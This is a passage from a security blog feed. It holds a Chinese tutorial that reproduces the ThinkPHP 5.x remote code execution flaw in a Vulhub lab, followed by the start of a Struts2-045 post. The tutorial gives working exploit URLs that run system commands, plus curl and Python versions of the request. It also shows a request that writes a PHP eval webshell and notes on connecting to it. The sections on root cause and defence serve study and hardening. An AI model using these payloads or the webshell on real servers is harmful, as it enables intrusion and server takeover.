/root/vulhub/thinkphp/5-rce&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 如果未下载 Vulhub，克隆项目&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/thinkphp/5-rce&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-启动漏洞环境&#34;&gt;&lt;a href=&#34;#3-启动漏洞环境&#34; class=&#34;headerlink&#34; title=&#34;3. 启动漏洞环境&#34;&gt;&lt;/a&gt;3. 启动漏洞环境&lt;/h3&gt;&lt;p&gt;在 vulhub&amp;#x2F;thinkphp&amp;#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;启动后，访问以下地址：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 &lt;/p&gt;
&lt;h3 id=&#34;4-容器管理操作&#34;&gt;&lt;a href=&#34;#4-容器管理操作&#34; class=&#34;headerlink&#34; title=&#34;4. 容器管理操作&#34;&gt;&lt;/a&gt;4. 容器管理操作&lt;/h3&gt;&lt;p&gt;查看运行中的容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;示例输出：&lt;/p&gt;
&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;CONTAINER ID   IMAGE                       PORTS                    NAMES&lt;br&gt;e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&amp;gt;80/tcp     thinkphp_5-rce_1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;停止指定容器：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker stop e5117e659934&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;一键停止并移除容器及网络：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;三、漏洞原理解析&#34;&gt;&lt;a href=&#34;#三、漏洞原理解析&#34; class=&#34;headerlink&#34; title=&#34;三、漏洞原理解析&#34;&gt;&lt;/a&gt;三、漏洞原理解析&lt;/h2&gt;&lt;h3 id=&#34;漏洞成因&#34;&gt;&lt;a href=&#34;#漏洞成因&#34; class=&#34;headerlink&#34; title=&#34;漏洞成因&#34;&gt;&lt;/a&gt;漏洞成因&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 &lt;code&gt;\think\app::invokeFunction&lt;/code&gt;）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;），并传递函数名和参数，从而触发远程代码执行。&lt;/p&gt;
&lt;h3 id=&#34;核心问题&#34;&gt;&lt;a href=&#34;#核心问题&#34; class=&#34;headerlink&#34; title=&#34;核心问题&#34;&gt;&lt;/a&gt;核心问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;动态函数调用&lt;/strong&gt;：&lt;code&gt;call_user_func_array&lt;/code&gt; 允许动态调用任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt; 等）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数未过滤&lt;/strong&gt;：用户输入的 &lt;code&gt;vars[0]&lt;/code&gt;（函数名）和 &lt;code&gt;vars[1][]&lt;/code&gt;（函数参数）直接传递到函数执行器，未经严格验证。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;路由暴露&lt;/strong&gt;：通过 &lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;，攻击者可直接访问框架核心类。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞危害&#34;&gt;&lt;a href=&#34;#漏洞危害&#34; class=&#34;headerlink&#34; title=&#34;漏洞危害&#34;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;执行任意 PHP 代码&lt;/li&gt;
&lt;li&gt;运行系统命令，获取权限&lt;/li&gt;
&lt;li&gt;上传 WebShell，长期控制服务器&lt;/li&gt;
&lt;li&gt;窃取配置文件、数据库信息&lt;/li&gt;
&lt;li&gt;删除文件或修改系统配置&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、漏洞利用演示&#34;&gt;&lt;a href=&#34;#四、漏洞利用演示&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞利用演示&#34;&gt;&lt;/a&gt;四、漏洞利用演示&lt;/h2&gt;&lt;p&gt;以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。&lt;/p&gt;
&lt;h3 id=&#34;1-测试-PHP-函数调用&#34;&gt;&lt;a href=&#34;#1-测试-PHP-函数调用&#34; class=&#34;headerlink&#34; title=&#34;1. 测试 PHP 函数调用&#34;&gt;&lt;/a&gt;1. 测试 PHP 函数调用&lt;/h3&gt;&lt;p&gt;访问以下 Payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数解析&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;：指定路由&lt;/li&gt;
&lt;li&gt;&lt;code&gt;function=call_user_func_array&lt;/code&gt;：调用函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[0]=phpinfo&lt;/code&gt;：目标函数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[1][]=1&lt;/code&gt;：参数（执行 phpinfo(1)）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;页面显示 phpinfo 配置信息，说明漏洞存在 &lt;/p&gt;
&lt;h3 id=&#34;2-执行系统命令&#34;&gt;&lt;a href=&#34;#2-执行系统命令&#34; class=&#34;headerlink&#34; title=&#34;2. 执行系统命令&#34;&gt;&lt;/a&gt;2. 执行系统命令&lt;/h3&gt;&lt;p&gt;执行 &lt;code&gt;whoami&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果示例&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;表示系统命令执行成功。&lt;/p&gt;
&lt;h3 id=&#34;其他命令测试：&#34;&gt;&lt;a href=&#34;#其他命令测试：&#34; class=&#34;headerlink&#34; title=&#34;其他命令测试：&#34;&gt;&lt;/a&gt;其他命令测试：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;查看用户 ID：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;列出目录：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ls%20/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;查看网络配置：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ifconfig&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-使用-Curl-测试&#34;&gt;&lt;a href=&#34;#3-使用-Curl-测试&#34; class=&#34;headerlink&#34; title=&#34;3. 使用 Curl 测试&#34;&gt;&lt;/a&gt;3. 使用 Curl 测试&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;注意：URL 中的 &lt;code&gt;\&lt;/code&gt; 要写成 &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;4-使用-Burp-Suite-测试&#34;&gt;&lt;a href=&#34;#4-使用-Burp-Suite-测试&#34; class=&#34;headerlink&#34; title=&#34;4. 使用 Burp Suite 测试&#34;&gt;&lt;/a&gt;4. 使用 Burp Suite 测试&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在浏览器中访问目标页面，拦截请求&lt;/li&gt;
&lt;li&gt;将 Payload 粘贴进 Repeater 中测试&lt;/li&gt;
&lt;li&gt;修改 &lt;code&gt;vars[1][]&lt;/code&gt; 的值如 &lt;code&gt;id&lt;/code&gt;、&lt;code&gt;ls&lt;/code&gt; 等&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五、Payload-结构总结&#34;&gt;&lt;a href=&#34;#五、Payload-结构总结&#34; class=&#34;headerlink&#34; title=&#34;五、Payload 结构总结&#34;&gt;&lt;/a&gt;五、Payload 结构总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数键&lt;/th&gt;
&lt;th&gt;功能说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;请求路由，指向 ThinkPHP 核心类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;要调用的 PHP 函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;执行的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;函数的参数数组（如 &lt;code&gt;whoami&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;六、防御措施&#34;&gt;&lt;a href=&#34;#六、防御措施&#34; class=&#34;headerlink&#34; title=&#34;六、防御措施&#34;&gt;&lt;/a&gt;六、防御措施&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级 ThinkPHP 版本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;升级至 ThinkPHP 5.0.24 或更高版本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;输入验证与过滤&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白名单验证 &lt;code&gt;s&lt;/code&gt; 参数&lt;/li&gt;
&lt;li&gt;禁用危险函数如 &lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;严格过滤所有用户输入参数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中：&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;disable_functions = &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;system&lt;/span&gt;,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Web 服务运行用户不要使用 &lt;code&gt;root&lt;/code&gt;，限制文件访问权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;部署 WAF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拦截请求中包含敏感函数或路径的攻击尝试。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全审计与监控&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;定期扫描、日志审计，发现异常行为。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;七、笔记总结&#34;&gt;&lt;a href=&#34;#七、笔记总结&#34; class=&#34;headerlink&#34; title=&#34;七、笔记总结&#34;&gt;&lt;/a&gt;七、笔记总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内容项&lt;/th&gt;
&lt;th&gt;信息&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;漏洞类型&lt;/td&gt;
&lt;td&gt;RCE（远程代码执行）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;影响版本&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.0.x 至 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;漏洞原因&lt;/td&gt;
&lt;td&gt;动态函数调用缺乏授权校验&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;复现方式&lt;/td&gt;
&lt;td&gt;URL GET 请求构造 Payload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;环境工具&lt;/td&gt;
&lt;td&gt;Vulhub、Docker、Kali Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;八、附加玩法&#34;&gt;&lt;a href=&#34;#八、附加玩法&#34; class=&#34;headerlink&#34; title=&#34;八、附加玩法&#34;&gt;&lt;/a&gt;八、附加玩法&lt;/h2&gt;&lt;h3 id=&#34;自动化检测脚本&#34;&gt;&lt;a href=&#34;#自动化检测脚本&#34; class=&#34;headerlink&#34; title=&#34;自动化检测脚本&#34;&gt;&lt;/a&gt;自动化检测脚本&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;response = requests.get(url)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;www-data&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Vulnerability found!&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No vulnerability detected.&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;上传-WebShell&#34;&gt;&lt;a href=&#34;#上传-WebShell&#34; class=&#34;headerlink&#34; title=&#34;上传 WebShell&#34;&gt;&lt;/a&gt;上传 WebShell&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;使用蚁剑连接：&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.102:8080/shell.php&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;提权尝试&#34;&gt;&lt;a href=&#34;#提权尝试&#34; class=&#34;headerlink&#34; title=&#34;提权尝试&#34;&gt;&lt;/a&gt;提权尝试&lt;/h3&gt;&lt;p&gt;结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;九、总结&#34;&gt;&lt;a href=&#34;#九、总结&#34; class=&#34;headerlink&#34; title=&#34;九、总结&#34;&gt;&lt;/a&gt;九、总结&lt;/h2&gt;&lt;p&gt;ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。&lt;/p&gt;
&lt;p&gt;开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。&lt;/p&gt;
&lt;p&gt;希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;⚠️-免责声明&#34;&gt;&lt;a href=&#34;#⚠️-免责声明&#34; class=&#34;headerlink&#34; title=&#34;⚠️ 免责声明&#34;&gt;&lt;/a&gt;⚠️ 免责声明&lt;/h2&gt;&lt;p&gt;本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。&lt;/p&gt;
</content>
        <category term="Web安全" />
        <category term="漏洞复现" />
        <category term="RCE" />
        <category term="ThinkPHP" />
        <updated>2025-07-27T09:25:25.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
        <title>Struts2-045远程代码执行漏洞复现与原理分析</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;h1 id=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;a href=&#34;#Struts2-045远程代码执行漏洞复现与原理分析&#34; class=&#34;headerlink&#34; title=&#34;Struts2-045远程代码执行漏洞复现与原理分析&#34;&gt;&lt;/a&gt;Struts2-045远程代码执行漏洞复现与原理分析&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;&lt;a href=&#34;#漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;漏洞概述&#34;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。&lt;/p&gt;
